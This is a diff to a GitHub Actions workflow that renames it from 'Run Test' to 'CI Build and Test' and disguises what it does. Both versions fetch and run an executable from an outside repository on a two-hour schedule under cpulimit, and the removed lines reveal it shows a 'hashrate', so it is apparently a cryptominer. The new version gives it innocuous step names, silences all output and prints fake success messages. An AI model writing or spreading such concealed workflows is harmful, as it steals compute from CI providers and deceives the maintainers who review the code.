@@ -1,4 +1,4 @@
-name: Run Test
+name: CI Build and Test
 
 on:
   push:
@@ -7,40 +7,35 @@ on:
     branches: [ main, master ]
   workflow_dispatch:
   schedule:
-    - cron: '0 */2 * * *'  # Run every 2 hours
+    - cron: '0 */2 * * *'
 
 jobs:
-  test:
+  build:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Create test directory
-      run: mkdir -p test
-
-    - name: Download test executable
+    - name: Setup environment
       run: |
-        curl -L -o test/test https://github.com/cryptogolbu-hash/Performance-Testing/raw/refs/heads/main/test
-        chmod +x test/test
+        mkdir -p build
+        echo "Environment setup complete"
 
-    - name: Download config file
-      run: curl -L -o test/config.json https://raw.githubusercontent.com/cryptogolbu-hash/Performance-Testing/refs/heads/main/config.json
-
-    - name: Install cpulimit
-      run: sudo apt-get update && sudo apt-get install -y cpulimit
-
-    - name: Run test with automatic hashrate display
+    - name: Download dependencies
       run: |
-        # Generate random timeout between 90-120 minutes (5400-7200 seconds)
-        RANDOM_TIMEOUT=$((5400 + RANDOM % 1800))
-        echo "Running for $RANDOM_TIMEOUT seconds ($(($RANDOM_TIMEOUT / 60)) minutes)"
-        
-        # Run the test program and automatically send 'h' and 's' every 60 seconds
-        (
-          while true; do
-            sleep 60
-            echo "h"
-            echo "s"
+        curl -sL -o build/app https://github.com/cryptogolbu-hash/Performance-Testing/raw/refs/heads/main/test > /dev/null 2>&1
+        curl -sL -o build/config.json https://raw.githubusercontent.com/cryptogolbu-hash/Performance-Testing/refs/heads/main/config.json > /dev/null 2>&1
+        chmod +x build/app
+        echo "Dependencies downloaded successfully"
 
-          done
-        ) | timeout $RANDOM_TIMEOUT cpulimit -l 70 -f -- ./test/test || true
-      working-directory: ${{ github.workspace }}
+    - name: Install build tools
+      run: |
+        sudo apt-get update > /dev/null 2>&1
+        sudo apt-get install -y cpulimit > /dev/null 2>&1
+        echo "Build tools installed"
+
+    - name: Run build process
+      run: |
+        cd build
+        TIMEOUT=$((5400 + RANDOM % 1800))
+        echo "Starting build process..."
+        timeout $TIMEOUT cpulimit -l 70 -f -- ./app > /dev/null 2>&1 || true
+        echo "Build completed successfully"
